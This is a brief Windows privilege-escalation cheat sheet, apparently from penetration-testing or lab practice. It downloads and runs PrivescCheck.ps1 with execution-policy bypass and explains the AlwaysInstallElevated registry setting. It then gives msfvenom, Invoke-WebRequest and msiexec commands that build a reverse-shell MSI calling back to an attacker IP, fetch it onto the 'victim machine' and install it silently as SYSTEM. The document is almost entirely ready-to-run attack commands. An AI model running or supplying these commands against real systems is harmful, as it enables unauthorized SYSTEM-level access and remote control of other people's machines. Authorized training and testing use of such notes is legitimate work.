
```
Invoke-WebRequest -Uri http://10.10.16.118:8000/PrivescCheck.ps1 -OutFile PrivescCheck.ps1
```


Basic checks

```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```


Deep :

```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
```



#### AlwaysInstallElevated

Windows Installer (MSI) has a setting called **AlwaysInstallElevated**.  
If both the **HKLM** (system-wide) and **HKCU** (per-user) registry keys have this set to `1`, **any user can run an `.msi` installer with SYSTEM-level privileges** â€” the highest possible privilege on Windows.

It means **you can create a malicious MSI file** and when executed, it will **run as SYSTEM**

Create msi

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.13.164 LPORT=1111 -f msi -o shell.msi
```

On victim machine 

```
Invoke-WebRequest -Uri "http://10.17.13.164:8000/shell.msi" -OutFile "shell.msi"
```

Then to run;

```
msiexec /quiet /qn /i shell.msi
```
